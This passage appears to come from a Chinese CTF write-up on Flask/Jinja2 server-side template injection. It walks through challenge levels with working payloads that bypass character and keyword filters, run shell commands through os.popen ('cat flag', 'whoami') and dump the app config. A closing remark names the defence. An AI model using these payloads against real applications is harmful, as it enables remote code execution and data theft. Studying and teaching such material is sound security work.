**_常用过滤器_**
    length() # 获取一个序列或者字典的长度并将其返回
    int()：# 将值转换为int类型；
    float()：# 将值转换为float类型；
    lower()：# 将字符串转换为小写；
    upper()：# 将字符串转换为大写；
    reverse()：# 反转字符串；
    replace(value,old,new)： # 将value中的old替换为new
    list()：# 将变量转换为列表类型；
    string()：# 将变量转换成字符串类型；
    join()：# 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用
    attr(): # 获取对象的属性
回到原题,本题我们利用到的过滤器为`attr()`.其用法为 `foo|attr("bar")`,结果等价于`foo.bar`
我们可以利用`request.args`向attr里面传入参数,
但这里再介绍一种编码绕过,
`__class__ => \x5f\x5fclass\x5f\x5f`
其中`_`的十六进制编码为`\x5f`
构造payload,拿到flag
> paload原型:
> ().__class__.__base__.__subclasses__()[132].__init__.__globals__['open’](‘cat
> flag').read()
`{{()|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(132)|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")('popen')('cat
flag')|attr("read")()}}`
### 拓展
除了可以使用十六进制编码外,还可以使用unioncode
`__class__`=>`\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f`
[例子](https://buaq.net/go-74232.html):
`{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}`
**_Unicode编码后:_**
`{{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(77)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("ls")|attr("read")()}}`
## Level 7 bypass .
初步尝试发现过滤了`.`,其余没有任何过滤,此处可以使用`[]`绕过.
> [You can use a dot (`.`) to access attributes of a variable in addition to
> the standard Python `__getitem__` “subscript” syntax
> (`[]`).](https://jinja.palletsprojects.com/en/3.0.x/templates/#variables)
>
> python语法除了可以使用点 `.`来访问对象属性外,还可以使用中括号`[]`.同样也可以使用__getitem__
构造payload,拿到flag
`{{()['__class__']['__base__']['__subclasses__']()[132]['__init__']['__globals__']['popen']('cat
flag')['read']()}}`
## Level 8 bypass keywords
从提示可以看到ban了许多关键字.此处可以使用`字符串拼接`绕过
构造payload,拿到flag
`{{()['__cla''ss__']['__ba''se__']['__subcla''sses__']()[132]['__in''it__']['__glo''bals__']['popen']('cat
flag')['read']()}}`
### 拓展
除了使用简单的字符串拼接方式外,还可以使用:
  1. 字符编码(上面介绍过,就不再提了)
  2. 使用`Jinjia2`中的`~`进行拼接.如`{%set a="__cla"%}{%set aa="ss__"%}{{a~aa}}`
  3. 使用`join`过滤器.例如使用`{%set a=dict(__cla=a,ss__=a)|join%}{{a}}`,会将`__cla`和`ss__`拼接在一起,或者`{%set a=['__cla','ss__']|join%}{{a}}`
  4. 使用`reverse`过滤器.如`{%set a="__ssalc__"|reverse%}{{a}}`
  5. 使用`replace`过滤器.如`{%set a="__claee__"|replace("ee","ss")%}{{a}}`
  6. 利用python的`char()`.例如
        {% set chr=url_for.__globals__['__builtins__'].chr %}
    {{""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}
…
## Level 9 bypass number
从提示可以看出ban了所有数字,所以这道题得想办法构造数字.使用过滤器`|length`可以绕过
使用过滤器构造132
`{% set a='aaaaaaaaaaa'|length*'aaa'|length*'aaaa'|length %}{{a}}`
`{{()['__class__']['__base__']['__subclasses__']()[132]['__init__']['__globals__']['popen']('cat
flag')['read']()}}`
构造payload,拿到flag
`{% set a='aaaaaaaaaaa'|length*'aaa'|length*'aaaa'|length
%}{{()['__class__']['__base__']['__subclasses__']()[a]['__init__']['__globals__']['popen']('cat
flag')['read']()}}`
## Level 10
这一关的目的是拿到config,当我们使用`{{config}}`以及`{{self}}`时都返回了None.看来是被ban了,所以得重新寻找一个储存相关信息的变量.
[通过寻找](https://ctftime.org/writeup/11036),发现存在这么一个变量`current_app`是我们需要的.[官网](http://docs.jinkan.org/docs/flask/appcontext.html)对`current_app`提供了这么一句说明
> 应用上下文会在必要时被创建和销毁。它不会在线程间移动，并且也不会在不同的请求之间共享。正因为如此，它是一个存储数据库连接信息或是别的东西的最佳位置。
因此,此处能使用`current_app`绕过.
构造payload,拿到config  
`{{url_for.__globals__['current_app'].config}}`  
`{{get_flashed_messages.__globals__['current_app'].config}}`
## Level 11 bypass combination1
这一关颜色和之前不同,感觉难度会有所增加.
绕过`' "`可以用request构造get参数代替,但是request 被ban了,request 可以使用字符串拼接构造,但是`'
"`又被ban了,`.`被过滤可以用`[]`绕过,但是`[]`也被ban了.`[]`可以用`__getitem__`绕过,`.`可以用`attr`绕过,这两个没有被过滤,说明还是有希望.现在关键就是怎么绕过`'
和 "`.
再`Level 9 bypass keyword` 的扩展中,使用过滤器`dict()|join`构造关键子的过程中没有出现`'
"`,可以使用这种办法绕过.
`{%set a=dict(__cla=a,ss__=b)|join%}{{()|attr(a)}}`
不过在后面构造命令`cat flag`时空格无法识别.通过这篇[博客](https://buaq.net/go-74232.html),发现了新思路.
### 绕过空格
通过以下构造可以得到字符串,举个例,可以发现输出的字符串中存在空格、部分数字、`
> payload原型:().__class__.__base__.__subclasses__()[132].__init__.__globals__[‘popen’](‘cat
> flag’).read()
    {%set a=dict(__cla=a,ss__=b)|join %}  # __class__
    {%set b=dict(__bas=a,e__=b)|join %}   # __basess__
    {%set c=dict(__subcla=a,sses__=b)|join %}    # __subclasses__
    {%set d=dict(__ge=a,titem__=a)|join%}    # __getitem__
    {%set e=dict(__in=a,it__=b)|join %}      # __init__
    {%set f=dict(__glo=a,bals__=b)|join %}  # __globals__
    {%set g=dict(pop=a,en=b)|join %}    # popen
    {%set h=self|string|attr(d)(18)%}   # 空格
    {%set i=(dict(cat=abc)|join,h,dict(flag=b)|join)|join%}  # cat flag
    {%set j=dict(read=a)|join%} # read
    {{()|attr(a)|attr(b)|attr(c)()|attr(d)(132)|attr(e)|attr(f)|attr(d)(g)(i)|attr(j)()}}
## Level 12 bypass combination2
这一关和上一关的区别在于 没有过滤`request`,但是过滤了数字.所以可以使用`request.args`绕过.
不过`request|attr("args")|attr("a")`并不能获取到通过get传递过来的`a参数`,所以这里得跟换为`request.args.get()`来获取get参数
如果还是从`().__class__`构造,那代码段就太冗长了.通过搜索,在羽师父的博客中学到了一条简洁的构造链.
`{{x.__init__.__globals__['__builtins__']}}`
构造payload,拿到flag
> payload原型:
> x.__init__.__globals__['__builtins__']['eval']("\\_\\_import\\_\\_\('os').popen('whoami').read()")
    {%set a={}|select|string|list%}
    {%set b=dict(pop=a)|join%}
    {%set c=a|attr(b)(self|string|length)%}  # _
    {%set d=(c,c,dict(getitem=a)|join,c,c)|join%}  # __getitem__
    {%set e=dict(args=a)|join%}     # args
    {%set f=dict(get=a)|join%}      # get
    {%set g=dict(z=a)|join%}        
    {%set gg=dict(zz=a)|join%}
    {%set ggg=dict(zzz=a)|join%}
    {%set gggg=dict(zzzz=a)|join%}
    {%set ggggg=dict(zzzzz=a)|join%}
    {{x|attr(request|attr(e)|attr(f)(g))|attr(request|attr(e)|attr(f)(gg))|attr(d)(request|attr(e)|attr(f)(ggg))|attr(d)(request|attr(e)|attr(f)(gggg))(request|attr(e)|attr(f)(ggggg))}}
## Level 13 bypass combination3
这道题把`request`给ban了,过滤了更多关键字,不过还是可以用`Level 12`的思路
构造payload,拿到flag
>
> payload原型:x.__init__.__globals__['__builtins__']['__import__'](‘os’).popen('cat
> flag').read()")
    {%set a={}|select|string|list%}
    {%set ax={}|select|string|list%}
    {%set aa=dict(ssss=a)|join%}
    {%set aaa=dict(ssssss=a)|join%}
    {%set aaaa=dict(ss=a)|join%}
    {%set aaaaa=dict(sssss=a)|join%}
    {%set b=dict(pop=a)|join%}   # pop
    {%set c=a|attr(b)(aa|length*aaa|length)%}  # _
    {%set cc=a|attr(b)(aaaa|length*aaaaa|length)%} # 空格
    {%set d=(c,c,dict(get=a,item=a)|join,c,c)|join%}  # __getitem__
    {%set dd=(c,c,dict(in=a,it=a)|join,c,c)|join%}   # __init__
    {%set ddd=(c,c,dict(glob=a,als=a)|join,c,c)|join%}   # __globals__
    {%set dddd=(c,c,dict(buil=a,tins=a)|join,c,c)|join%}   # __builtins__
    {%set e=(c,c,dict(impo=a,rt=a)|join,c,c)|join%}   # __import__
    {%set ee=(dict(o=a,s=a)|join)|join%}   # os
    {%set eee=(dict(po=a,pen=a)|join)|join%}  # popen
    {%set eeee=(dict(cat=a)|join,cc,dict(flag=a)|join)|join%}  # cat flag
    {%set f=(dict(rea=a,d=a)|join)|join%}  # read
    {{x|attr(dd)|attr(ddd)|attr(d)(dddd)|attr(d)(e)(ee)|attr(eee)(eeee)|attr(f)()}}
# 总结
本篇文章主要介绍了`Flask`的服务端模板注入.其漏洞成因大多数是因为程序员的偷懒或者安全意识较低.
`SSTI`既然属于代码注入,那漏洞利用必然是想法设法去实现执行代码.在`Flask`中,我们可以通过类与类之间的继承关系拿到能够执行代码的函数,从而进行`RCE`.
`ssti`的基础payload构造形如:
`().__class__.__base__.__subclasses__()[64].__init__.__globals__['__import__']('os').system('whoami')`
但在某些特定情况下可能存在不同字符的过滤,我们需要通过
`python`的一些内在特性或内建方法,尝试对被过滤字符进行构造.上面练习已经简单实现了部分字符bypass,但还不完全.读者可以尝试自行探索出更有趣的payload.
关于`Flask SSTI`的防御,推荐使用更安全的`rander_template()`代替`rander_template_string()`.
学无止境,希望这边能对各位师傅们有所帮助.
# 参考